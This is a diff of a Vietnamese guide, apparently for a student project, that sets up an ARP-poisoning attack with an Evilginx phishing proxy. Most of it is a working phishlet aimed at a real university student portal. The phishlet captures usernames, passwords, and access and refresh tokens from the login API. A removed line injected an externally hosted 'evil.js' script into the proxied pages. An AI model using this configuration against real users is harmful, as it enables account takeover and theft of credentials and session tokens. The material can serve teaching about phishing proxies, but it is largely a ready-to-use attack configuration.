@@ -1,5 +1,5 @@
 
-## CHUẨN BỊ
+## TẤN CÔNG ARP POISONING KẾT HỢP VỚI EVILGINX ĐỂ LÀM PROXY TẤN CÔNG MITM - CHUẨN BỊ
 
 - 1 MÁY KALI LINUX: IP 192.168.100.200
 - 1 MÁY VICTIM: IP 192.168.100.150
@@ -23,43 +23,68 @@ Bật terminal khác
 sudo apt update && sudo apt install
 ```
 ```
-git clone https://github.com/kgretzky/evilginx3.git
-cd evilginx3
-make
+wget https://github.com/kgretzky/evilginx2/releases/download/v3.3.0/evilginx-v3.3.0-linux-64bit.zip
+unzip evilginx-v3.3.0-linux-64bit.zip
 ```
 ```
 cd phishlets
-nano demo.yaml
+nano ttdt.yaml
 ```
-Thay địa chỉ <ĐỊA CHỈ NƠI UP EVIL.JS/EVIL.JS> (YÊU CẦU DÙNG HTTPS)
+
 ```
-name: sgu
-author: yourname
 min_ver: '3.0.0'
 
 proxy_hosts:
-  - {phish_sub: "", orig_sub: "", domain: "thongtindaotao.sgu.edu.vn", session: true, is_landing: true}
+  - {phish_sub: "", orig_sub: "", domain: "thongtindaotao.daihocsaigon.edu.vn", session: true, is_landing: true}
 
 sub_filters:
-  - {triggers_on: "thongtindaotao.sgu.edu.vn", orig_sub: "", domain: "thongtindaotao.sgu.edu.vn", search: "thongtindaotao.sgu.edu.vn", replace: "thongtindaotao.sgu.edu.vn", mimes: ["text/html", "application/javascript", "application/json"]}
-  - {triggers_on: "thongtindaotao.sgu.edu.vn", orig_sub: "", domain: "thongtindaotao.sgu.edu.vn", search: "</body>", replace: "<script src='https:///<ĐỊA CHỈ NƠI UP EVIL.JS/EVIL.JS>'></script></body>", mimes: ["text/html", "application/javascript", "application/json"] }
+  - {triggers_on: "thongtindaotao.daihocsaigon.edu.vn", orig_sub: "", domain: "thongtindaotao.daihocsaigon.edu.vn", search: "thongtindaotao.daihocsaigon.edu.vn", replace: "thongtindaotao.daihocsaigon.edu.vn", mimes: ["text/html", "application/javascript", "application/json"]}
+  - {triggers_on: "thongtindaotao.daihocsaigon.edu.vn", orig_sub: "", domain: "thongtindaotao.daihocsaigon.edu.vn", search: "</body>", replace: "<p style="text-align: center;">Demo được thực hiện nhằm mục đích làm đồ án</p></body>", mimes: ["text/html", "application/javascript", "application/json"]}
 
 auth_tokens:
-  - domain: thongtindaotao.sgu.edu.vn
-    keys: ['.*,regexp']
+  - domain: thongtindaotao.daihocsaigon.edu.vn
+    path: '/api/auth/login'
+    name: 'access_token'
+    search: '"access_token":"([^"]*)'
+    type: 'body'
+  - domain: thongtindaotao.daihocsaigon.edu.vn
+    path: '/api/auth/login'
+    name: 'refresh_token'
+    search: '"refresh_token":"([^"]*)'
+    type: 'body'
+  - domain: thongtindaotao.daihocsaigon.edu.vn
+    path: '/api/auth/login'
+    name: 'userName'
+    search: '"userName":"([^"]*)'
+    type: 'body'
+  - domain: thongtindaotao.daihocsaigon.edu.vn
+    path: '/api/auth/login'
+    name: 'name'
+    search: '"name":"([^"]*)'
+    type: 'body'
+  - domain: thongtindaotao.daihocsaigon.edu.vn
+    path: '/api/auth/login'
+    name: 'expires'
+    search: '".expires":"([^"]*)'
+    type: 'body'
+  - domain: thongtindaotao.daihocsaigon.edu.vn
+    path: '/api/auth/login'
+    name: 'issued'
+    search: '".issued":"([^"]*)'
+    type: 'body'
 
 credentials:
   username:
     key: "username"
-    search: "(.*)"
-    type: post
+    search: '(.*)'
+    type: 'post'
   password:
     key: "password"
-    search: "(.*)"
-    type: post
+    search: '(.*)'
+    type: 'post'
 
 login:
-  domain: thongtindaotao.sgu.edu.vn
+  domain: thongtindaotao.daihocsaigon.edu.vn
   path: /
 ```
 
